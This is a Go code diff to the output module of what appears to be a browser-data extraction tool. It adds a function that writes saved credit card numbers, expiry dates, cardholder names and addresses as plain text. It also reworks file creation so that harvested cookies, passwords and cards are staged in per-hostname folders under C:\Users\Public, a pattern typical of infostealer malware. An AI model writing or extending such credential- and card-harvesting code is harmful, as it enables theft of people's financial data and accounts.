@@ -44,6 +44,8 @@ func (o *outPutter) Write(data extractor.Extractor, writer io.Writer) error {
 
 		if strings.Contains(typeName, "password") {
 			return o.writePasswordFormat(val, writer)
+		} else if strings.Contains(typeName, "card") || strings.Contains(typeName, "credit") {
+			return o.writeCreditCardFormat(val, writer)
 		}
 	}
 
@@ -63,6 +65,58 @@ func (o *outPutter) Write(data extractor.Extractor, writer io.Writer) error {
 		})
 		return gocsv.Marshal(data, writer)
 	}
+}
+
+func (o *outPutter) writeCreditCardFormat(val reflect.Value, writer io.Writer) error {
+	for i := 0; i < val.Len(); i++ {
+		elem := val.Index(i)
+		if elem.Kind() == reflect.Ptr {
+			elem = elem.Elem()
+		}
+
+		var guid, name, month, year, number, address, nickname string
+
+		if f := elem.FieldByName("GUID"); f.IsValid() {
+			guid = f.String()
+		}
+		if f := elem.FieldByName("Name"); f.IsValid() {
+			name = f.String()
+		}
+		if f := elem.FieldByName("ExpirationMonth"); f.IsValid() {
+			month = f.String()
+		}
+		if f := elem.FieldByName("ExpirationYear"); f.IsValid() {
+			year = f.String()
+		}
+		if f := elem.FieldByName("CardNumber"); f.IsValid() {
+			number = f.String()
+		}
+		if f := elem.FieldByName("Address"); f.IsValid() {
+			address = f.String()
+		}
+		if f := elem.FieldByName("NickName"); f.IsValid() {
+			nickname = f.String()
+		}
+
+		if number == "" {
+			continue
+		}
+
+		cardLine := fmt.Sprintf("GUID: %s\nName: %s\nCard Number: %s\nExpiration: %s/%s\nAddress: %s\nNickname: %s\n=====================\n",
+			guid,
+			name,
+			number,
+			month,
+			year,
+			address,
+			nickname,
+		)
+
+		if _, err := writer.Write([]byte(cardLine)); err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 func (o *outPutter) writePasswordFormat(val reflect.Value, writer io.Writer) error {
@@ -254,32 +308,35 @@ func (o *outPutter) CreateFile(dir, filename string) (*os.File, error) {
 	rootDir := `C:\Users\Public`
 
 	var subDir string
-	if strings.Contains(strings.ToLower(filename), "cookie") {
+	switch {
+	case strings.Contains(strings.ToLower(filename), "cookie"):
 		subDir = filepath.Join(hostname, "Cookie")
-	} else if strings.Contains(strings.ToLower(filename), "password") {
+	case strings.Contains(strings.ToLower(filename), "password"):
 		subDir = filepath.Join(hostname, "Password")
-	} else {
+	case strings.Contains(strings.ToLower(filename), "creditcard"),
+		strings.Contains(strings.ToLower(filename), "card"),
+		strings.Contains(strings.ToLower(filename), "credit"):
+		subDir = filepath.Join(hostname, "CreditCard")
+	default:
 		subDir = hostname
 	}
 
 	fullDir := filepath.Join(rootDir, subDir)
 
-	if _, err := os.Stat(fullDir); os.IsNotExist(err) {
-		err := os.MkdirAll(fullDir, 0o750)
-		if err != nil {
-			return nil, err
-		}
+	// Create parent directories if they don't exist
+	if err := os.MkdirAll(fullDir, 0o750); err != nil {
+		return nil, fmt.Errorf("failed to create directory %s: %v", fullDir, err)
 	}
 
-	var file *os.File
+	// Create or open the file
 	p := filepath.Join(fullDir, filename)
-	file, err = os.OpenFile(filepath.Clean(p), os.O_TRUNC|os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
+	file, err := os.OpenFile(filepath.Clean(p), os.O_TRUNC|os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to create/open file %s: %v", p, err)
 	}
+
 	return file, nil
 }
-
 func (o *outPutter) Ext() string {
 	return o.format
 }
